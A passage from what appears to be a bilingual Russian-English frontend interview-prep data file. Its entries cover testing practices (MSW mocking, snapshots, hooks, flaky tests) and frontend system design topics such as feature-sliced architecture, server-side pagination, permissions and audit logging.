            "Тест не должен зависеть от реального сетевого запроса, реальной базы данных или реального таймера — это делает тесты медленными, нестабильными (флейки из-за сети) и трудными для проверки edge cases (например, 'что если сервер вернёт 500'). Мок — функция/модуль, которая имитирует поведение реальной зависимости и позволяет проверить, была ли она вызвана и с какими аргументами. Стаб — упрощённая версия, которая просто возвращает заранее заданное значение, не отслеживая вызовы. Для сетевых запросов часто используют MSW (Mock Service Worker), который перехватывает fetch/XHR на уровне сети, а не подменяет код приложения.",
          codeExample:
            "import { http, HttpResponse } from 'msw';\nimport { setupServer } from 'msw/node';\n\nconst server = setupServer(\n  http.get('/api/user', () => HttpResponse.json({ name: 'Anna' }))\n);\n\ntest('shows user name after loading', async () => {\n  render(<UserProfile />);\n  expect(await screen.findByText('Anna')).toBeInTheDocument();\n});",
          interviewQuestion: "Зачем мокать сетевые запросы вместо того, чтобы тестировать против реального (тестового) бэкенда?",
          interviewAnswerRu:
            "Мокирование делает тесты быстрыми (нет реальной сети), детерминированными (не зависят от состояния внешнего сервиса или тестовой БД) и позволяют легко проверить edge cases, которые трудно или невозможно воспроизвести на реальном бэкенде — например, таймаут, ошибку 500 или конкретную гоночную ситуацию. Тесты против реального бэкенда важны, но это уже задача integration/e2e-тестов на отдельном уровне пирамиды тестирования, а не unit-тестов компонента.",
          interviewAnswerEn:
            "Mocking makes tests fast (no real network), deterministic (not dependent on the state of an external service or test database), and lets you easily cover edge cases that are hard or impossible to reproduce against a real backend — a timeout, a 500 error, a specific race condition. Testing against a real backend still matters, but that's the job of integration/e2e tests at a different level of the testing pyramid, not a component's unit tests.",
          pitfalls: [
            "Мокать слишком глубоко (внутренние детали реализации модуля) вместо точки входа во внешнюю зависимость — тест ломается при рефакторинге, который не меняет поведение.",
            "Забывать сбрасывать моки между тестами (jest.clearAllMocks()) — результат одного теста влияет на следующий.",
          ],
          practiceTask:
            "Настройте MSW для перехвата одного GET-запроса в вашем приложении и напишите тест, который проверяет и успешный ответ, и ответ с ошибкой (500) для одного и того же компонента.",
          resources: {
            docs: [
              { title: "Mock Service Worker — Introduction", url: "https://mswjs.io/docs/" },
            ],
            articles: [
              { title: "But really, what is a JavaScript mock?", url: "https://kentcdodds.com/blog/but-really-what-is-a-javascript-mock" },
            ],
          },
        },
      },
      {
        id: "testing-snapshot",
        title: "Snapshot Testing",
        content: {
          title: "Snapshot Testing",
          shortExplanation:
            "Снапшот-тест сохраняет 'снимок' вывода компонента (обычно сериализованный DOM) в файл и в следующих запусках сравнивает текущий вывод с сохранённым, сообщая о любых отличиях.",
          detailedExplanation:
            "Снапшот-тесты полезны для быстрой проверки того, что структура вывода не изменилась случайно, но у них есть известная слабость: разработчики часто обновляют снапшот 'не глядя' (jest --updateSnapshot), когда тест падает, не проверяя, было ли изменение намеренным — в результате снапшот перестаёт что-либо реально гарантировать. Снапшоты лучше всего работают для небольших, стабильных, редко меняющихся структур (например, сериализация конфигурации), и хуже — для больших UI-компонентов, где любое косметическое изменение вёрстки роняет тест без реальной пользы.",
          codeExample:
            "test('renders button with correct structure', () => {\n  const { container } = render(<Button>Click me</Button>);\n  expect(container).toMatchSnapshot();\n});\n\n// При первом запуске создаётся __snapshots__/Button.test.tsx.snap\n// При последующих — вывод сравнивается с сохранённым файлом",
          interviewQuestion: "В чём главный риск снапшот-тестов для больших React-компонентов?",
          interviewAnswerRu:
            "Главный риск — 'слепое' обновление снапшотов: когда тест падает из-за любого изменения вёрстки (даже случайного или нежелательного), разработчик под давлением дедлайна часто просто запускает --updateSnapshot, не читая diff внимательно. В таком режиме снапшот-тест перестаёт защищать от реальных регрессий и превращается в формальность, которая создаёт ложное чувство защищённости, при этом требуя поддержки большого количества .snap файлов.",
          interviewAnswerEn:
            "The main risk is blindly updating snapshots: when a test fails because of any markup change (even an accidental or unwanted one), a developer under deadline pressure often just runs --updateSnapshot without carefully reading the diff. In that mode, snapshot tests stop protecting against real regressions and become a formality that creates a false sense of safety, while still requiring a large set of .snap files to maintain.",
          pitfalls: [
            "Делать огромные снапшоты целых страниц — любое косметическое изменение роняет тест, и diff невозможно осмысленно прочитать.",
            "Обновлять снапшоты автоматически в CI или 'не глядя', не читая, что именно изменилось и было ли это намеренно.",
          ],
          practiceTask:
            "Сделайте снапшот-тест для маленького переиспользуемого компонента (например, Badge или Tag), затем намеренно измените в нём один стиль и прочитайте diff снапшота перед обновлением.",
          resources: {
            docs: [
              { title: "Jest — Snapshot Testing", url: "https://jestjs.io/docs/snapshot-testing" },
            ],
            articles: [
              { title: "Common mistakes with React Testing Library", url: "https://kentcdodds.com/blog/common-mistakes-with-react-testing-library" },
            ],
          },
        },
      },
      {
        id: "testing-hooks",
        title: "Testing Custom Hooks",
        content: {
          title: "Testing Custom Hooks",
          shortExplanation:
            "Тестирование кастомных хуков проверяет их поведение (возвращаемые значения, реакцию на изменения) без необходимости рендерить конкретный UI-компонент, который их использует.",
          detailedExplanation:
            "Кастомный хук нельзя вызвать напрямую как обычную функцию в тесте — правила хуков требуют React-окружения. Для этого используется renderHook из @testing-library/react, который 'монтирует' хук в тестовый компонент-обёртку и даёт доступ к его возвращаемому значению через result.current, а также к функции rerender для симуляции изменения пропсов и act для обёртывания асинхронных обновлений состояния.",
          codeExample:
            "import { renderHook, act } from '@testing-library/react';\n\ntest('useCounter increments value', () => {\n  const { result } = renderHook(() => useCounter());\n\n  act(() => {\n    result.current.increment();\n  });\n\n  expect(result.current.count).toBe(1);\n});",
          interviewQuestion: "Почему нельзя просто вызвать customHook() напрямую внутри теста, как обычную функцию?",
          interviewAnswerRu:
            "Потому что внутри кастомного хука используются другие хуки React (useState, useEffect и т.д.), а они требуют находиться в контексте рендеринга React-компонента — правила хуков (Rules of Hooks) запрещают вызывать их вне тела компонента или другого хука. Если вызвать хук как обычную функцию вне React-дерева, React не сможет связать его состояние с конкретным компонентом и упадёт с ошибкой. renderHook решает это, создавая минимальный тестовый компонент-обёртку под капотом.",
          interviewAnswerEn:
            "Because a custom hook internally uses other React hooks (useState, useEffect, etc.), and those require being inside a React component's render context — the Rules of Hooks forbid calling them outside a component or another hook's body. Calling the hook as a plain function outside a React tree means React has no component to attach its state to, and it errors out. renderHook solves this by creating a minimal test wrapper component under the hood.",
          pitfalls: [
            "Забывать оборачивать вызовы, меняющие состояние, в act() — тест может выдавать предупреждения или неактуальный result.current.",
            "Тестировать кастомный хук только через полноценный рендер компонента-потребителя, когда renderHook дал бы более простой и быстрый тест.",
          ],
          practiceTask:
            "Напишите тест для useDebounce (или useLocalStorage) из раздела Practice Tasks с помощью renderHook, проверив и начальное значение, и поведение после изменения входных данных.",
          resources: {
            docs: [
              { title: "Testing Library — renderHook API", url: "https://testing-library.com/docs/react-testing-library/api/" },
            ],
            articles: [
              { title: "How to test custom React hooks — Kent C. Dodds", url: "https://kentcdodds.com/blog/how-to-test-custom-react-hooks" },
            ],
          },
        },
      },
      {
        id: "testing-jest-vitest-playwright",
        title: "Jest vs Vitest vs Playwright",
        content: {
          title: "Jest vs Vitest vs Playwright",
          shortExplanation:
            "Jest и Vitest — тест-раннеры для unit/integration-тестов (запускают JS-код в Node-подобной среде с эмуляцией DOM); Playwright — инструмент для E2E-тестов, который управляет настоящим браузером и проверяет приложение так, как его видел бы реальный пользователь.",
          detailedExplanation:
            "Jest — исторически самый распространённый тест-раннер для React, но он не понимает ESM нативно и требует трансформации кода (через Babel или ts-jest), что на больших проектах заметно замедляет запуск тестов. Vitest спроектирован специально под Vite и современный ESM-стек — переиспользует уже настроенный Vite-конфиг проекта (алиасы путей, плагины), запускает тесты значительно быстрее за счёт нативного ESM и той же архитектуры, что и dev-сервер, и предоставляет API, почти идентичный Jest (describe/it/expect), что делает миграцию относительно простой. Оба инструмента используют jsdom или happy-dom — эмуляцию DOM в Node.js, а не настоящий браузер, поэтому они не могут поймать проблемы, специфичные для реального рендеринга (реальные CSS-вычисления, реальные размеры элементов, реальное поведение браузерных API). Playwright — принципиально другой класс инструмента: он запускает настоящий Chromium/Firefox/WebKit, кликает, вводит текст и проверяет визуальные/сетевые аспекты так, как это реально происходит в браузере, и специально предназначен для E2E-сценариев (полный путь пользователя через несколько страниц), а не для быстрых изолированных unit-тестов отдельных функций/компонентов.",
          codeExample:
            "// Vitest — unit/component-тест (jsdom, без реального браузера)\nimport { render, screen } from '@testing-library/react';\ntest('shows greeting', () => {\n  render(<Greeting name=\"Alex\" />);\n  expect(screen.getByText('Hello, Alex')).toBeInTheDocument();\n});\n\n// Playwright — E2E-тест (реальный браузер)\nimport { test, expect } from '@playwright/test';\ntest('user can log in', async ({ page }) => {\n  await page.goto('/login');\n  await page.fill('input[name=email]', 'test@example.com');\n  await page.click('button[type=submit]');\n  await expect(page).toHaveURL('/dashboard');\n});",
          whereUsed:
            "Jest/Vitest — unit-тесты утилит и хуков, integration-тесты компонентов с React Testing Library. Playwright — критичные пользовательские сценарии end-to-end (регистрация, оформление заказа, оплата), кросс-браузерная проверка, визуальная регрессия через встроенные screenshot-сравнения.",
          interviewQuestion: "Почему нельзя полностью заменить E2E-тесты на Playwright большим количеством unit/component-тестов на Jest/Vitest?",
          interviewAnswerRu:
            "Jest/Vitest с jsdom эмулируют DOM в Node.js — это быстро, но не отражает реальное поведение браузера: настоящие вычисленные стили, реальные размеры элементов, взаимодействие нескольких страниц через настоящую навигацию, куки и сетевые запросы так, как их видит реальный браузер. Даже если каждый компонент по отдельности покрыт unit-тестами и работает верно в изоляции, интеграционная проблема (например, редирект после логина работает не так, как ожидается, из-за реальных cookie-настроек) может проявиться только в реальном браузере — именно это и проверяет Playwright, воспроизводя полный путь пользователя, а не изолированный фрагмент кода.",
          interviewAnswerEn:
            "Jest/Vitest with jsdom emulate the DOM in Node.js — fast, but it doesn't reflect real browser behavior: actual computed styles, real element sizes, multi-page interaction through real navigation, cookies, and network requests the way an actual browser handles them. Even if every component is individually unit-tested and works correctly in isolation, an integration problem (say, the post-login redirect behaving differently because of real cookie settings) might only show up in an actual browser — that's exactly what Playwright checks, reproducing the full user journey rather than an isolated code fragment.",
          pitfalls: [
            "Пытаться тестировать сложные пользовательские сценарии (несколько страниц, реальная навигация) через jsdom-тесты вместо E2E — jsdom не воспроизводит реальное поведение браузера.",
            "Делать E2E-тестами Playwright покрытие каждой мелкой функции вместо unit-тестов — E2E-тесты значительно медленнее и дороже в поддержке для такой гранулярности.",
          ],
        },
      },
      {
        id: "testing-flaky-tests",
        title: "Flaky Tests",
        content: {
          title: "Flaky Tests (нестабильные тесты)",
          shortExplanation:
            "Flaky-тест — тест, который иногда падает, а иногда проходит без каких-либо изменений в коде между запусками — обычно из-за скрытой зависимости от времени, порядка выполнения или реальной сети, а не из-за настоящего бага в проверяемом коде.",
          detailedExplanation:
            "Частые причины flakiness: жёстко заданные задержки (await sleep(1000) вместо ожидания конкретного условия) — тест либо ждёт слишком долго 'на всякий случай' (медленно), либо иногда не успевает дождаться реального события (падает); неочищенное состояние между тестами (мок, не сброшенный в afterEach, или общий инстанс, используемый несколькими тестами, которые выполняются в непредсказуемом порядке); реальные сетевые запросы вместо мокированных (тест зависит от доступности и скорости внешнего сервиса, которую тест не контролирует); race conditions в самом асинхронном коде теста (несколько промисов, порядок разрешения которых не гарантирован). Лечение по каждой причине разное: заменить фиксированные задержки на явное ожидание условия (waitFor из Testing Library, которое опрашивает условие до истинности или таймаута, вместо гадания с конкретным числом миллисекунд), явно изолировать состояние между тестами (beforeEach/afterEach с полным сбросом моков), замокать всё внешнее (сеть, время, случайность) вместо того, чтобы полагаться на реальное окружение. Игнорирование flaky-тестов (просто ретраить их в CI, пока не пройдут) — не решение, а маскировка проблемы: команда постепенно перестаёт доверять красному статусу тестов вообще, что обесценивает саму цель тестирования.",
          codeExample:
            "// Flaky: жёсткая задержка вместо ожидания реального условия\ntest('shows loaded data', async () => {\n  render(<Widget />);\n  await new Promise((r) => setTimeout(r, 500)); // иногда 500мс мало, иногда — избыточно много\n  expect(screen.getByText('Data loaded')).toBeInTheDocument();\n});\n\n// Стабильно: явное ожидание конкретного условия\ntest('shows loaded data', async () => {\n  render(<Widget />);\n  await waitFor(() => expect(screen.getByText('Data loaded')).toBeInTheDocument());\n});",
          whereUsed:
            "Диагностика CI-пайплайнов с нестабильными прогонами тестов, ревью тестов на асинхронный код перед мержем, любые тесты, взаимодействующие с реальным временем, сетью или общим состоянием между тестами.",
          interviewQuestion: "Почему автоматический retry нестабильного теста в CI до первого зелёного результата — плохая практика?",
          interviewAnswerRu:
            "Retry скрывает симптом (тест иногда падает), но не устраняет причину (реальную гонку состояний, зависимость от таймингов или неочищенное состояние) — тест остаётся ненадёжным индикатором, просто CI теперь не показывает это открыто. Со временем команда привыкает, что 'красный тест — это нормально, просто перезапусти', и перестаёт реагировать на реальные падения тестов как на сигнал настоящей проблемы — в какой-то момент реальный баг в коде тоже будет скрыт за привычным 'наверное, просто flaky' вместо расследования, что полностью обесценивает смысл автоматических тестов как сигнала доверия.",
          interviewAnswerEn:
            "Retrying hides the symptom (the test sometimes fails) without fixing the cause (an actual race condition, timing dependency, or leftover state) — the test remains an unreliable signal, CI just stops showing it openly. Over time the team gets used to 'a red test is normal, just rerun it' and stops treating real test failures as a signal of an actual problem — eventually a genuine bug in the code will also get dismissed as 'probably just flaky' instead of investigated, which completely undermines the point of automated tests as a trust signal.",
          pitfalls: [
            "Использовать фиксированные setTimeout-задержки в тестах вместо явного ожидания конкретного условия.",
            "Настраивать автоматический retry flaky-тестов в CI 'чтобы не мешали' вместо расследования и устранения реальной причины нестабильности.",
          ],
        },
      },
      {
        id: "testing-what-to-test",
        title: "Что тестировать, а что — нет",
        content: {
          title: "Что тестировать, а что — нет",
          shortExplanation:
            "Тестировать стоит поведение, которое видит пользователь, и бизнес-логику, ошибки в которой дорого стоят; не стоит тестировать детали реализации (внутренний state, конкретные имена внутренних функций) — такие тесты ломаются при рефакторинге, даже если реальное поведение не изменилось.",
          detailedExplanation:
            "Принцип, за которым стоит React Testing Library ('чем больше ваш тест похож на то, как реальный пользователь использует приложение, тем больше уверенности он даёт') — тестировать через то, что видит и делает пользователь (найти текст на экране, кликнуть кнопку, проверить, что появилось сообщение), а не через доступ к внутренней реализации компонента (не проверять напрямую значение внутреннего useState или вызов конкретного приватного метода). Тесты, завязанные на детали реализации, дают ложное чувство защищённости: они массово падают при чисто косметическом рефакторинге (переименовали внутреннюю переменную, поменяли структуру компонентов без изменения видимого поведения), создавая шум и приучая игнорировать красные тесты, вместо того чтобы падать именно тогда, когда реально изменилось поведение, важное для пользователя. Не всё заслуживает одинакового покрытия: критичная бизнес-логика (расчёт цены, права доступа, валидация оплаты) заслуживает подробных тестов множества edge cases, а тривиальный проп-дриллинг или простая презентационная разметка без логики — не оправдывает отдельного теста ради самого факта 'есть тест'. Стопроцентное покрытие кода — не самоцель и не гарантия качества: можно иметь 100% покрытие строк кода и при этом не проверять ни одного реального пользовательского сценария, если тесты вызывают функции, но не проверяют осмысленные утверждения о результате.",
          codeExample:
            "// Плохо: тест завязан на деталь реализации (имя внутреннего state)\ntest('increments internal counter state', () => {\n  const { result } = renderHook(() => useCounterInternal());\n  expect(result.current._internalCount).toBe(0); // деталь реализации, а не поведение\n});\n\n// Хорошо: тест проверяет видимое пользователю поведение\ntest('increments displayed count on click', () => {\n  render(<Counter />);\n  fireEvent.click(screen.getByText('Increment'));\n  expect(screen.getByText('Count: 1')).toBeInTheDocument();\n});",
          whereUsed:
            "Формирование стратегии тестирования на старте проекта, ревью тестов в PR ('этот тест проверяет поведение или реализацию?'), приоритизация, какие части кодовой базы заслуживают более глубокого покрытия edge cases.",
          interviewQuestion: "Почему тест, проверяющий внутреннее состояние компонента напрямую, считается плохой практикой?",
          interviewAnswerRu:
            "Такой тест привязан не к контракту компонента с внешним миром (что видит и может сделать пользователь), а к случайным деталям текущей реализации — внутреннему имени переменной состояния, структуре внутренних хуков. При любом чисто внутреннем рефакторинге (даже без изменения видимого поведения) такой тест ломается, хотя реального регресса нет — это создаёт постоянный шум, отнимающий время на 'починку' тестов, которые на самом деле ничего не сломали, и со временем приучает команду воспринимать падение тестов как рутинную помеху, а не как значимый сигнал о реальной проблеме.",
          interviewAnswerEn:
            "Such a test is tied not to the component's contract with the outside world (what the user sees and can do), but to incidental details of the current implementation — an internal state variable's name, the structure of internal hooks. Any purely internal refactor (even with no change to visible behavior) breaks such a test, even though there's no real regression — this creates constant noise, wasting time 'fixing' tests that didn't actually catch anything broken, and over time trains the team to treat test failures as routine friction rather than a meaningful signal of a real problem.",
          pitfalls: [
            "Писать тесты, обращающиеся к внутреннему состоянию или приватным методам компонента напрямую, вместо проверки видимого поведения.",
            "Гнаться за метрикой процента покрытия кода как самоцелью вместо содержательной проверки реальных пользовательских сценариев и edge cases.",
          ],
        },
      },

    ],
  },

  {
    id: "frontend-system-design",
    title: "Frontend System Design",
    subtopics: [
      {
        id: "fsd-large-react-app",
        title: "Архитектура крупного React-приложения",
        content: {
          title: "Архитектура крупного React-приложения",
          shortExplanation:
            "На масштабе (десятки разработчиков, сотни экранов) главный архитектурный вопрос — не 'какую библиотеку выбрать', а как разбить приложение на независимые модули так, чтобы команды могли работать параллельно, не наступая друг другу на ноги, а изменение одной фичи не требовало понимания всего приложения целиком.",
          detailedExplanation:
            "Типичный подход — feature-sliced или модульная структура: код группируется не по техническому типу файла (все хуки в одной папке, все компоненты в другой), а по бизнес-фиче (orders/, catalog/, checkout/), каждая со своим внутренним ui/model/api и явным публичным интерфейсом (обычно index.ts, реэкспортирующий только то, что нужно снаружи). Границы между фичами защищаются линтер-правилами (например, eslint-plugin-boundaries), которые физически запрещают импорт из внутренних файлов чужой фичи в обход её публичного интерфейса — без этого правила изоляция фич быстро размывается прямыми импортами 'напрямую в обход', и система откатывается к прежней связанности. Общий (shared) слой — переиспользуемый UI-кит, утилиты, типовые хуки — выделяется отдельно и не должен содержать бизнес-логику конкретной фичи (см. тему Component Boundaries & Shared Layer). На уровне build-инфраструктуры крупные приложения часто переходят на монорепозиторий с несколькими независимо собираемыми пакетами, что позволяет командам деплоить и версионировать свои части независимо, а инструментам вроде Turborepo/Nx — кешировать и параллелить сборку/тесты только тех пакетов, что реально изменились.",
          codeExample:
            "src/\n  features/\n    orders/\n      ui/          # компоненты, специфичные для orders\n      model/       # стор, хуки, бизнес-логика orders\n      api/         # запросы к API, специфичные для orders\n      index.ts     # публичный интерфейс — единственная точка импорта извне\n    catalog/\n      ...\n  shared/\n    ui/            # переиспользуемый UI-кит без бизнес-логики\n    lib/           # общие утилиты",
          whereUsed:
            "Продукты с несколькими независимыми командами фронтенда, долгоживущие приложения (2+ года), где накопленная связанность без чётких границ становится главным тормозом скорости разработки.",
          interviewQuestion: "Как feature-sliced архитектура помогает нескольким командам работать параллельно без постоянных конфликтов?",
          interviewAnswerRu:
            "Каждая фича инкапсулирует свою внутреннюю реализацию и предоставляет только явный публичный интерфейс — команда, работающая над catalog, не должна знать о внутреннем устройстве orders и не может (благодаря линтер-правилам) случайно завязаться на его внутренние детали. Это резко снижает число merge-конфликтов и 'случайных' связей между несвязанными частями системы, потому что физическая структура кода отражает бизнес-границы, а не технические слои, разбросанные по всему приложению.",
          interviewAnswerEn:
            "Each feature encapsulates its internal implementation and exposes only an explicit public interface — the team working on catalog doesn't need to know orders' internals and can't (thanks to linter rules) accidentally couple to its internal details. This sharply reduces merge conflicts and 'accidental' coupling between unrelated parts of the system, because the physical code structure mirrors business boundaries rather than technical layers scattered across the whole app.",
          pitfalls: [
            "Вводить feature-sliced структуру без линтер-правил, физически запрещающих обход публичного интерфейса — соглашение без инструмента проверки быстро нарушается под дедлайнами.",
            "Копировать сложную модульную структуру из более крупного проекта в маленькое приложение — накладные расходы не окупаются на таком масштабе.",
          ],
        },
      },
      {
        id: "fsd-large-tables-pagination",
        title: "Дашборд: большие таблицы и server-side пагинация",
        content: {
          title: "Дашборд: большие таблицы и server-side пагинация",
          shortExplanation:
            "Таблица с десятками тысяч строк не может ни рендериться целиком в DOM (виртуализация), ни фильтроваться/сортироваться только на клиенте (сервер должен делать это на уровне БД) — архитектура большого дашборда строится вокруг того, что сервер отдаёт только нужную страницу уже отфильтрованных и отсортированных данных.",
          detailedExplanation:
            "Client-side фильтрация/сортировка/пагинация работает, только пока весь набор данных уже загружен в браузер — для десятков тысяч записей это означает либо неприемлемо большую начальную загрузку, либо вовсе невозможность (данные не помещаются в память или превышают лимиты API). Server-side подход переносит фильтры, сортировку и пагинацию в query-параметры запроса к серверу (?filter[status]=active&sort=-createdAt&cursor=...), и клиент рендерит только то, что реально пришло за одну страницу — это требует синхронизации состояния фильтров с URL (чтобы обновление страницы и шаринг ссылки сохраняли текущий вид данных, см. тему URL State) и правильной инвалидации кеша TanStack/RTK Query при смене любого из параметров запроса (обычно решается включением всех параметров в query key). Виртуализация (см. отдельную тему) дополнительно нужна даже для одной 'страницы' данных, если сама страница содержит несколько сотен строк — сервер и клиентская виртуализация решают разные, дополняющие друг друга проблемы: сервер ограничивает объём переданных данных, виртуализация — объём отрендеренных DOM-узлов из уже полученных данных.",
          codeExample:
            "// Состояние таблицы синхронизировано с URL и с query key запроса\nfunction useTableQuery() {\n  const searchParams = useSearchParams();\n  const filters = { status: searchParams.get('status'), sort: searchParams.get('sort') };\n\n  return useQuery({\n    queryKey: ['orders', filters, searchParams.get('cursor')], // любой параметр меняет key -> новый запрос\n    queryFn: () => fetchOrders(filters, searchParams.get('cursor')),\n  });\n}",
          whereUsed:
            "Админ-панели с большими таблицами заказов/пользователей/логов, дашборды мониторинга с постоянно растущими наборами данных, любые B2B-интерфейсы с фильтрацией по десяткам параметров.",
          interviewQuestion: "Почему для таблицы с 50 000 строк нельзя просто загрузить все данные один раз и фильтровать/сортировать их на клиенте?",
          interviewAnswerRu:
            "Загрузка 50 000 записей целиком означает большой начальный payload (медленная загрузка, особенно на мобильных сетях), значительное потребление памяти браузера для хранения всего набора, и сам факт, что при таком объёме данных даже фильтрация в памяти на клиенте (пусть и быстрая) не отменяет необходимости сначала эти данные передать по сети. Server-side фильтрация/сортировка/пагинация решает это, потому что БД эффективно (особенно с нужными индексами) находит и возвращает только 20-50 нужных строк для конкретной страницы с конкретными фильтрами, вместо передачи всего набора данных клиенту, который бы использовал лишь малую его часть на экране одновременно.",
          interviewAnswerEn:
            "Loading all 50,000 records at once means a large initial payload (slow, especially on mobile networks), significant browser memory usage to hold the entire set, and the simple fact that at this volume, even fast in-memory client-side filtering doesn't remove the need to transfer that data over the network first. Server-side filtering/sorting/pagination solves this because the database efficiently (especially with the right indexes) finds and returns only the 20-50 rows needed for a specific page with specific filters, instead of shipping the entire dataset to a client that would only use a small slice of it on screen at once.",
          pitfalls: [
            "Загружать весь набор данных и фильтровать на клиенте 'для простоты' — работает на демо с 50 записями и полностью ломается на проде с 50 000.",
            "Не включать все активные фильтры в query key стейт-менеджера — кеш будет отдавать неверные (для текущих фильтров) данные из предыдущего запроса.",
          ],
        },
      },
      {
        id: "fsd-realtime-permissions-slow-backend",
        title: "Real-time обновления, права доступа, медленный бэкенд",
        content: {
          title: "Real-time обновления, права доступа, медленный бэкенд",
          shortExplanation:
            "Три часто встречающихся в системном дизайне усложнения одного и того же дашборда: данные должны обновляться в реальном времени для других пользователей, разные роли должны видеть разный набор данных/действий, а часть бэкенд-запросов объективно медленная и не должна блокировать весь экран.",
          detailedExplanation:
            "Real-time обновления обычно реализуются через WebSocket/SSE (см. отдельную тему), но интеграция с кешем стейт-менеджера требует решения: полученное по сокету событие 'запись изменилась' должно либо точечно обновить конкретную запись в кеше TanStack/RTK Query (queryClient.setQueryData), либо просто инвалидировать нужный query key, вызвав контролируемый рефетч — прямая мутация локального React state в обход единого кеша быстро создаёт рассинхронизацию между 'живыми' данными с сокета и обычными REST-данными того же ресурса. Права доступа на фронтенде — это UX-удобство (скрыть недоступные действия/данные), а не единственный слой защиты — экран не должен просто визуально прятать кнопку 'Удалить' по роли, полагаясь только на клиентскую проверку: сервер обязан независимо проверять права при каждом запросе, потому что клиентский код полностью подконтролен пользователю и может быть обойдён. Медленный бэкенд-эндпоинт (например, генерация сложного отчёта) не должен блокировать рендер остальной части экрана — решения включают Suspense-streaming (см. тему Streaming в Next.js) для SSR-страниц, отдельные независимые query для быстрых и медленных частей экрана (а не один общий запрос за всеми данными разом), и явную индикацию 'эта часть ещё грузится' вместо общего блокирующего спиннера на всю страницу.",
          codeExample:
            "// Точечное обновление кеша по real-time событию вместо полного рефетча\nsocket.on('order:updated', (updatedOrder) => {\n  queryClient.setQueryData(['order', updatedOrder.id], updatedOrder);\n  queryClient.invalidateQueries({ queryKey: ['orders'] }); // список тоже нужно освежить\n});\n\n// UI прячет действие по роли, но сервер — источник истины по правам\n{user.role === 'admin' && <DeleteButton onClick={() => api.deleteOrder(id)} />}\n// api.deleteOrder на сервере ВСЕГДА проверяет права независимо от того, показал ли UI кнопку",
          whereUsed:
            "Дашборды мониторинга и совместной работы (несколько пользователей видят одни данные одновременно), приложения с ролевой моделью доступа (админ/менеджер/обычный пользователь), экраны, зависящие от медленных агрегирующих бэкенд-эндпоинтов (отчёты, аналитика).",
          interviewQuestion: "Почему скрытие кнопки действия на фронтенде по роли пользователя не является настоящей защитой?",
          interviewAnswerRu:
            "Весь клиентский код полностью находится под контролем пользователя — он может открыть DevTools, изменить состояние приложения, напрямую вызвать нужный API-запрос через консоль или curl, полностью в обход UI, который якобы 'скрыл' недоступное действие. Скрытие кнопки по роли — это исключительно улучшение UX (не показывать пользователю то, чем он всё равно не сможет воспользоваться), а не механизм безопасности; настоящая проверка прав обязана происходить на сервере при обработке каждого запроса независимо от того, что показывал или не показывал клиентский интерфейс.",
          interviewAnswerEn:
            "All client-side code is entirely under the user's control — they can open DevTools, alter application state, or directly call the underlying API request via the console or curl, completely bypassing a UI that supposedly 'hid' an unavailable action. Hiding a button by role is purely a UX improvement (not showing the user something they couldn't use anyway), not a security mechanism; real permission checks must happen on the server when processing every request, regardless of what the client interface did or didn't display.",
          pitfalls: [
            "Полагаться только на клиентскую проверку прав доступа без дублирующей проверки на сервере при каждом запросе.",
            "Мутировать локальный React state напрямую по real-time событиям в обход единого кеша стейт-менеджера — создаёт два независимых, рассинхронизирующихся источника истины для одних и тех же данных.",
          ],
        },
      },
      {
        id: "fsd-observability-audit-logging",
        title: "Production Observability & Audit Logging",
        content: {
          title: "Production Observability & Audit Logging",
          shortExplanation:
            "Observability на фронтенде — это способность понять, что реально происходит у пользователей в проде (ошибки, производительность, аномальное поведение), не дожидаясь, пока они сами напишут в поддержку; audit logging — фиксация значимых действий пользователей для последующего разбора инцидентов и требований комплаенса.",
          detailedExplanation:
            "Три основных источника наблюдаемости фронтенда: error tracking (Sentry и подобные — автоматически ловят необработанные исключения и React error boundary события, с контекстом: какой пользователь, какая версия приложения, какие действия предшествовали ошибке), Real User Monitoring/RUM (реальные Core Web Vitals и время загрузки, собранные с настоящих посещений реальных пользователей, а не из лабораторных прогонов Lighthouse), и структурированное логирование ключевых бизнес-событий (не 'console.log', а отправка событий в централизованную систему с достаточным контекстом для разбора). Audit log отличается от обычного логирования ошибок целью: он фиксирует не 'что сломалось', а 'кто и что сделал' — кто изменил права доступа, кто удалил запись, кто одобрил транзакцию — обычно с неизменяемостью записей (append-only) и достаточным контекстом (кто, когда, что именно изменилось, с какого IP/сессии), что критично для комплаенс-требований (финтех, медицина) и разбора инцидентов постфактум. Важный архитектурный выбор — не логировать чувствительные данные (пароли, полные номера карт, токены) даже в целях отладки, и заранее продумать, какие события действительно нужны для будущего разбора, а не логировать 'всё подряд', что создаёт шум, замедляет поиск нужного события и раздувает расходы на хранение.",
          codeExample:
            "// Error tracking с контекстом\nSentry.captureException(error, {\n  tags: { feature: 'checkout' },\n  extra: { orderId, userId, appVersion },\n});\n\n// Audit-событие — не ошибка, а факт значимого действия\nauditLog.record({\n  action: 'order.refund.approved',\n  actorId: currentUser.id,\n  targetId: orderId,\n  timestamp: new Date().toISOString(),\n});",
          whereUsed:
            "Любое production-приложение с реальными пользователями нуждается как минимум в error tracking и RUM; audit logging обязателен там, где есть регуляторные требования (финтех, медицина, HR-системы) или где важна прослеживаемость чувствительных действий (изменение прав, финансовые операции).",
          interviewQuestion: "Чем audit log принципиально отличается от обычных логов ошибок/отладки?",
          interviewAnswerRu:
            "Обычные логи ошибок и отладочные логи существуют, чтобы разработчик мог понять, ПОЧЕМУ что-то сломалось технически — они могут быть многословными, временными, ротируемыми и не обязаны быть неизменяемыми. Audit log существует, чтобы зафиксировать факт значимого бизнес-действия (кто, что, когда сделал) для последующего разбора инцидентов или требований комплаенса — записи в audit log обычно неизменяемы (append-only, их нельзя отредактировать или удалить постфактум) и хранятся значительно дольше, потому что их цель — не отладка кода, а прослеживаемость реальных действий пользователей и систем.",
          interviewAnswerEn:
            "Regular error and debug logs exist so a developer can understand WHY something technically broke — they can be verbose, temporary, rotated, and don't need to be immutable. An audit log exists to record the fact of a significant business action (who did what, when) for later incident review or compliance requirements — audit log entries are typically immutable (append-only, can't be edited or deleted after the fact) and retained much longer, because their purpose isn't debugging code but tracing real actions taken by users and systems.",
          pitfalls: [
            "Логировать чувствительные данные (пароли, токены, полные номера карт) даже в целях отладки — прямое нарушение требований безопасности и часто комплаенса.",
            "Логировать 'всё подряд' без разбора важности события — создаёт шум, затрудняющий поиск действительно значимого события при разборе инцидента, и раздувает расходы на хранение логов.",
          ],
        },
      },
    ],
  },


  {
    id: "lead-senior-engineering",
    title: "Lead / Senior Engineering",
    subtopics: [
      {
        id: "lead-code-review-tech-debt",
        title: "Code Review & Technical Debt",
        content: {
          title: "Code Review & Technical Debt",
          shortExplanation:
